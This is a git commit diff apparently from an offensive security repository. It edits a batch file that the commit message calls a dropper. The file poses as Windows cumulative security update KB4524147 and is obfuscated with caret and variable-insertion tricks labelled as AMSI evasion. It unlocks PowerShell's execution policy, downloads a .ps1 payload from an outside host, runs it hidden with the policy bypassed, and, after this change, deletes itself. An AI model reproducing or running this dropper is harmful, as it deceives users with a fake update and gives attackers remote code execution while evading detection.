209a27a7bf5f6fab1d6bfee7ac696b33ed3a1837
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2020-02-29 19:23:55 +0000

    Update Update-KB4524147.bat
    Auto-Delete of 'Update-KB4524147.bat' (dropper)

--- mimiRatz/Update-KB4524147.bat
+++ mimiRatz/Update-KB4524147.bat
@@ -1,4 +1,4 @@
 @echo off
 :: Framework: venom v1.0.16 (amsi evasion)
 ( ,;(=i%@Socket():%f ;no%k%t ^DE%DB_#1%FIN^ED ,%@%IS_%Buff_%MINI%#1%MI%'i'%ZE^D ;se%#0_%t ^IS_MIN^IM%#1_%IZ^ED=1 && @st^a%db%rt "" ^/m%_#1%i^n "%~dpnx0" %* && e%GUID%x^it); ), && ,Col%ls%or 0E && (,(@tit%&1%le ^Cumu%_UUID_%l^ati%#1%v^e Sec%#1%u^ri%_i_%ty Up^dat%'%e KB%Buff_%4524147 && Pow%#1%e^rsh^el%Socket():%l Ge^t-Hot%vibes%Fi^x),) && @cm%Buff#1%d ^/R ec^h%i0%o A|Pow^er%_GUID_%sh^ell Set-Exec^uti%'B%onPo^li%send(i)%cy Unr%db%e^stric^t%OFF%ed -Sc%_i0%o^pe Cur%_%r^ent%LANG%Us^er && =Pow^er%Buff%sh^eL%#i_%l -C ;(NeW-Obj%KB_3457147%eCt Net.WebC%Channel()%li^eNt).Dow%#1%nl%ON%oAd%'%F^iL%i0_%e('ht%ttf%tp://CharlieBrown/Update-KB4%pop%5241^47.p%'%s1', '%tmp%\Update-KB4524147.p%'%s1') && @Cd %tmp% && ,pOw%_Socket(i)_%eR^sh%_i_%El^L -ExeC^ut%'b%I^oN ByP%\x0a%a^Ss -Win%_#1%dOw^stY^le hI%i0%d^Den -NoP%_i%r^Ofi%stuff%Le -Fi%Nal%l^E %tmp%\Update-KB452%_#i0_%4147.p%'%s1
-exit
+Del /Q /F Update-KB4524147.bat && exit
